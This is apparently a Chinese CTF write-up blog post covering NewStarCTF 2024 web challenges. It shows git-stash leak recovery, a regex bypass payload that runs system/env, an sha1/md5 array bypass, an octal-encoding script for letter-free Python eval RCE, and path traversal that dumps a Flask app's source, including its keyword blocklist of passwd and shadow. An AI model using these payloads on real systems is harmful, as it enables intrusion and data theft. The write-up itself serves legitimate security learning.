        <content type="html"><![CDATA[<p>西电链接：</p><p><a href="https://ctf.xidian.edu.cn/">西电 CTF 终端</a></p><h1 id="Week-2"><a href="#Week-2" class="headerlink" title="Week 2"></a>Week 2</h1><h2 id="pangbai过家家-2"><a href="#pangbai过家家-2" class="headerlink" title="pangbai过家家(2)"></a>pangbai过家家(2)</h2><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-19-51.png" class=""><p>连接进入，叫清点泄露文件</p><p>首先用dirsearch扫一下目录</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-20-18.png" class=""><p>发现.git文件，确定为git泄露，用Githack把泄露的文件下载下来</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-23-18.png" class=""><p>log和branch都没有找到后门，还有可能的就是stash(临时保存区)了</p><p><a href="https://geek-docs.com/git/git-cmds/git-stash.html">Git – Stash命令|极客教程</a></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-25-21.png" class=""><p>发现后面，用stash apply将暂存区重新应用</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-29-56.png" class=""><p>找到后门文件源代码，发现是一个正则表达式绕过</p><p><mark>关键点1：<em>非法字符转换下划线</em></mark></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-33-33.png" class=""><p>故这里在提交payload时，NewStar_CTF.2024要写为NewStar[CTF.2024</p><p><mark>关键点2：<em>正则表达式首位检测绕过</em></mark></p><p>preg_match默认为单行模式，如果字符串末尾是换行符，则换行符会被当做行尾而不是字符串的一部分，但是在严格不等于!&#x3D;&#x3D;中，”Welcome”和”Welcome\n”是不等的，</p><p>所以这里构造的最终payload是 <u>NewStar[CTF.2024&#x3D;Welcome%0a</u>（%0a是换行符的url编码）</p><p>func&#x3D;system</p><p>args&#x3D;’ls &#x2F;‘</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-05-42.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-05-35.png" class=""><p>传入发现没有回显，猜测是ls &#x2F;被过滤了或者缺少权限（？其实我也不知道为什么），因为之前的flag大部分都在环境变量里，所以这里尝试用env语句打印环境变量</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-06-06.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-06-32.png" class=""><p>得到flag</p><h2 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h2><p>题目是拉链，想到zip，应该是一个.zip源码泄露，所以先扫一下目录看看</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip1.png" class=""><p>果然有，下载下来，拿到源代码</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip2.png" class=""><p>有一个php内容如下</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip3.png" class=""><p>是一个简单的比较绕过</p><p><em>sha_1和md5强相等，这个应该是很难找到两个字符符合要求的，所以想到传入两个数组，这样两个函数的返回值都是null，就可以强相等了，同时也绕过了不等号</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip4.png" class=""><p>代码里把cat和flag过滤了，我们用和cat效果差不多的more来读取文件，flag也不用打全，用通配符*即可</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip5.png" class=""><h1 id="week-3"><a href="#week-3" class="headerlink" title="week 3"></a>week 3</h1><h2 id="臭皮的计算器"><a href="#臭皮的计算器" class="headerlink" title="臭皮的计算器"></a>臭皮的计算器</h2><p>载入页面，叫我们去&#x2F;cal路径，来到这个路径后，查看源代码，发现后端flask源码直接给了</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal2.png" class=""><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    token = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:</span><br><span class="line">            token = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        num = request.form.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">        script = <span class="string">f&#x27;&#x27;&#x27;import os</span></span><br><span class="line"><span class="string">print(eval(&quot;<span class="subst">&#123;num&#125;</span>&quot;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(script)</span><br><span class="line">        <span class="keyword">if</span> waf(num):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result_output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">with</span> tempfile.NamedTemporaryFile(mode=<span class="string">&#x27;w+&#x27;</span>, suffix=<span class="string">&#x27;.py&#x27;</span>, delete=<span class="literal">False</span>) <span class="keyword">as</span> temp_script:</span><br><span class="line">                    temp_script.write(script)</span><br><span class="line">                    temp_script_path = temp_script.name</span><br><span class="line"></span><br><span class="line">                result = subprocess.run([<span class="string">&#x27;python3&#x27;</span>, temp_script_path], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">                os.remove(temp_script_path)</span><br><span class="line"></span><br><span class="line">                result_output = result.stdout <span class="keyword">if</span> result.returncode == <span class="number">0</span> <span class="keyword">else</span> result.stderr</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">                result_output = <span class="built_in">str</span>(e)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=result_output)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&quot;臭皮！你想干什么！！&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&#x27;试试呗&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">30002</span>)</span><br></pre></td></tr></table></figure><p>分析源码可得，我们输入num，程序自动计算num的表达式数值，且用到了eval函数，这里包含一个RCE漏洞，但关键在于，还有一个防火墙，过滤了所有字母，所以是一个无字母的RCE。</p><p>python的无字母rce，用的比较多的是八进制绕过，这里简单写一个程序把我们的payload转为八进制编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">txt=<span class="built_in">input</span>(<span class="string">&quot;payload:&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">    <span class="keyword">if</span> i.isalpha() <span class="keyword">or</span> i==<span class="string">&#x27;_&#x27;</span> :</span><br><span class="line">        payload+=<span class="string">&#x27;\\&#x27;</span>+<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=i</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal3.png" class=""><p>传入得到flag</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal4.png" class=""><h2 id="这照片是你吗"><a href="#这照片是你吗" class="headerlink" title="这照片是你吗"></a>这照片是你吗</h2><p>连入环境，日常看源代码找提示</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph1.png" class=""><p>这里不太看得明白其中的原理，但隐约感觉应该有任意文件读取的漏洞，这里随便试一下访问图片</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph2.png" class=""><p>看上去是可以用路径访问文件的，那么就得弄明白源代码在哪，继续收集信息发现</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph3.png" class=""><p>这里的server是python，应该是flask，那么源代码应该是在app.py</p><p>而且一般flask的静态文件都放在和app.py同目录的static文件夹里，猜测可能当前目录就是static，试试路径穿透</p><p><em>注意这里不要直接在浏览器目录端口写..&#x2F;，会被过滤掉，要抓包后修改</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph4.png" class=""><p>拿到源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, render_template_string, request, redirect, send_file</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_random_number_string</span><br><span class="line"></span><br><span class="line">base_key = <span class="built_in">str</span>(uuid.uuid4()).split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">secret_key = get_random_number_string(<span class="number">6</span>)</span><br><span class="line">admin_pass = <span class="string">&quot;&quot;</span>.join([ _ <span class="keyword">for</span> _ <span class="keyword">in</span> base_key])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(admin_pass)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">failure_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: admin_pass,</span><br><span class="line">    <span class="string">&#x27;amiya&#x27;</span>: <span class="string">&quot;114514&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> failure_count</span><br><span class="line">        <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            failure_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/home&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">global</span> failure_count</span><br><span class="line">    <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username)==password:</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">600</span>&#125;, secret_key)</span><br><span class="line">        response = make_response(<span class="string">&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        failure_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = make_response(<span class="string">&#x27;Logout success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    logged_in = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        text = <span class="string">&quot;Hello, %s!&quot;</span> % data.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        logged_in = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        logged_in = <span class="literal">False</span></span><br><span class="line">        text = <span class="string">&quot;You have not logged in!&quot;</span></span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Home Page&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 图标能够正常显示耶! --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; text &#125;&#125;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if logged_in %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot;&gt;登出&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;登录&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if user==&quot;admin&quot; %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/admin&quot;&gt;Go to admin panel&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/2.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/1.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, text=text, logged_in=logged_in, user=data.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> verify_token(token)</span><br><span class="line">        resp_text = render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">                &lt;title&gt;Admin Panel&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;body&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Admin Panel&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;input&quot; value=&#123;&#123;api_url&#125;&#125; id=&quot;api&quot; readonly&gt;</span></span><br><span class="line"><span class="string">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;script&gt;</span></span><br><span class="line"><span class="string">                    function execute() &#123;</span></span><br><span class="line"><span class="string">                        fetch(&quot;&#123;&#123;url&#125;&#125;/execute?api_address=&quot;+document.getElementById(&quot;api&quot;).value,</span></span><br><span class="line"><span class="string">                                      &#123;credentials: &quot;include&quot;&#125;</span></span><br><span class="line"><span class="string">                                      ).then(res =&gt; res.text()).then(data =&gt; &#123;</span></span><br><span class="line"><span class="string">                            document.write(data);</span></span><br><span class="line"><span class="string">                        &#125;);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &lt;/script&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, api_url=request.host_url+<span class="string">&quot;/api&quot;</span>, url=request.host_url)</span><br><span class="line">        resp = make_response(resp_text)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    api_address = request.args.get(<span class="string">&quot;api_address&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> api_address:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;No api address!&quot;</span>, <span class="number">400</span>)</span><br><span class="line">    response = requests.get(api_address, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    resp = make_response(<span class="string">f&quot;Server Info: <span class="subst">&#123;os.popen(<span class="string">&#x27;uname -a&#x27;</span>).read()&#125;</span>&quot;</span>)</span><br><span class="line">    resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:file&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_file</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="built_in">print</span>(file)</span><br><span class="line">    restricted_keywords = [<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;etc&quot;</span>, </span><br><span class="line">                           <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;lib&quot;</span>, <span class="string">&quot;tmp&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;boot&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> file <span class="keyword">for</span> keyword <span class="keyword">in</span> restricted_keywords):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;STOP!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./static/&quot;</span> + file):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Not found!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&quot;./static/&quot;</span> + file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 